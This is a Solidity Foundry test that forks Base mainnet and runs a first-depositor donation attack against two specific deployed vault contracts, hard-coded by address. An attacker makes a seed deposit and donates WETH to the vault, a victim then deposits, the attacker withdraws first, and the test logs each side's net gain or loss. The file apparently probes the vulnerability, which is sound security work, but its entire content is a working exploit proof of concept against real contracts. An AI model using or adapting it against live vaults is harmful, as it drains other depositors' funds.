// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;

import "forge-std/Test.sol";
import "../src/Interfaces.sol";

contract AttackTest is Test {
    address constant WETH = 0x4200000000000000000000000000000000000006;
    address constant V1 = 0x2AeCe2BE0651baE5e2EF49426060B814E245829c;
    address constant V3 = 0xE205B423935FA14626b095205C7ADa44DaEB935f;
    bytes32 constant WITHDRAWN = keccak256("Withdrawn(address,address,uint256,uint256,uint256)");
    bytes32 constant DEPOSITED = keccak256("Deposited(address,address,uint256,uint256,uint256)");

    address attacker = address(0xA11CE);
    address victim   = address(0xB0B);

    function setUp() public {
        string memory rpc = vm.envOr("BASE_RPC_URL", string(""));
        if (bytes(rpc).length == 0) rpc = "https://mainnet.base.org";
        vm.createSelectFork(rpc);
    }

    function _probe(address v, uint256 seed, uint256 donation, uint256 vdep) internal {
        emit log_named_address("=== vault", v);
        emit log_named_uint("seed", seed);
        emit log_named_uint("donation", donation);
        emit log_named_uint("victimDep", vdep);

        deal(WETH, attacker, 100 ether);
        deal(WETH, victim, 100 ether);

        // 1) attacker seed deposit
        vm.startPrank(attacker);
        IERC20(WETH).approve(v, type(uint256).max);
        uint256 ashares = IDexFiVault(v).deposit(seed, attacker, 0);
        vm.stopPrank();
        emit log_named_uint("attacker seed shares", ashares);

        // 2) donation
        vm.prank(attacker);
        IERC20(WETH).transfer(v, donation);

        // 3) victim deposit
        vm.startPrank(victim);
        IERC20(WETH).approve(v, type(uint256).max);
        uint256 vshares = IDexFiVault(v).deposit(vdep, victim, 0);
        vm.stopPrank();
        emit log_named_uint("victim shares", vshares);

        // 4) attacker withdraws FIRST
        uint256 aBefore = IERC20(WETH).balanceOf(attacker);
        uint256 abal = IDexFiVault(v).balanceOf(attacker);
        vm.prank(attacker);
        uint256 aOut = IDexFiVault(v).withdraw(abal, attacker, 0);
        emit log_named_uint("attacker WETH out", aOut);
        emit log_named_int("attacker NET (out-(seed+donation))",
            int256(IERC20(WETH).balanceOf(attacker)) - int256(aBefore) + int256(aOut) - int256(seed + donation));

        // 5) victim withdraws after
        uint256 vBefore = IERC20(WETH).balanceOf(victim);
        uint256 vb = IDexFiVault(v).balanceOf(victim);
        vm.prank(victim);
        uint256 vOut = IDexFiVault(v).withdraw(vb, victim, 0);
        emit log_named_uint("victim WETH out", vOut);
        emit log_named_int("victim NET (out-dep)",
            int256(IERC20(WETH).balanceOf(victim)) - int256(vBefore) + int256(vOut) - int256(vdep));
    }

    function test_attack_V3() public { _probe(V3, 0.05 ether, 5 ether, 1 ether); }
    function test_attack_V1() public { _probe(V1, 0.01 ether, 2 ether, 1 ether); }
}
